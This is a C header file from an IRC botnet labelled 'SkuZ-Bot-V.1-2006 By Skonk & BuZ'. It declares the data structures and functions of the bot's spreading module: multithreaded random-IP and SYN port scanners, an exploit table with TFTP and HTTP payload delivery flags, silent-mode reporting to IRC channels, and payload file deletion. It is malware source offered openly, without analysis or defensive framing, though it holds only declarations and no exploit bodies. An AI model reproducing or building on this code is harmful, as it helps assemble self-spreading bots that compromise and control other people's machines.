///////////////////////////////////////////////////////////////
//       __ _          _____          _           _          //
//      / _\ | ___   _/ _  /         | |__   ___ | |_        //
//      \ \| |/ / | | \// /   _____  | '_ \ / _ \| __|       //
//      _\ \   <| |_| |/ //\ |_____| | |_) | (_) | |_        //
//      \__/_|\_\\__,_/____/         |_.__/ \___/ \__|       //
//                                                           //
//   ____        _____          ____  _               _  __  //
//  | __ ) _   _|__  /  _ __   / ___|| | _____  _ __ | |/ /  //
//  |  _ \| | | | / /  | '_ \  \___ \| |/ / _ \| '_ \| ' /   //
//  | |_) | |_| |/ /_  | | | |  ___) |   < (_) | | | | . \   //
//  |____/ \__,_/____| |_| |_| |____/|_|\_\___/|_| |_|_|\_\  //
//                                                           //
/////////////////////////////////////////////////////////////// 
typedef struct ADVSCAN 
{
	char ip[16];
	char chan[128];
	char msgchan[128];
	SOCKET sock;
	unsigned int port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	DWORD host;
	BOOL notice;
	BOOL silent;
	BOOL random;
	BOOL gotinfo;
	BOOL cgotinfo;

} ADVSCAN;

typedef struct ADVINFO 
{
	unsigned long ip;
	BOOL info;

} ADVINFO;

typedef struct EXINFO 
{
	SOCKET sock;
	char ip[16];
	char chan[128];
	char command[10];
	unsigned int port;
	unsigned int threadnum;
	int exploit;
	BOOL option;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} EXINFO;

typedef BOOL (*efref)(EXINFO exinfo);

typedef struct EXPLOIT 
{
	char command[10];
	char name[30];
	unsigned int port;
	efref exfunc;
	unsigned int stats;
	BOOL tftp;
	BOOL http;

} EXPLOIT;

typedef struct SCANALL 
{
	char command[10];
	bool isend;
} SCANALL;

typedef struct recvhdr 
{
	struct iphdr ip;
	struct tcphdr2 tcp;
	unsigned char junk_data[65535];

} RECVHEADER;

void ListExploitStats(SOCKET sock, char *chan, BOOL notice);
void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum);
void CheckServers(ADVSCAN scan);
unsigned long AdvGetNextIP(int threadnum);
unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum);
BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay);
BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned int port, unsigned int delay);
DWORD WINAPI AdvPortScanner(LPVOID param);
DWORD WINAPI AdvScanner(LPVOID param);
//DWORD WINAPI ADVHttpdScanner(EXINFO exinfo);
void DelPayloadFile(SOCKET sock, char *chan, BOOL notice, BOOL silent);
/////////////////////////////////////////////////
//       SkuZ-Bot-V.1-2006    By Skonk & BuZ   //
///////////////////////////////////////////////// 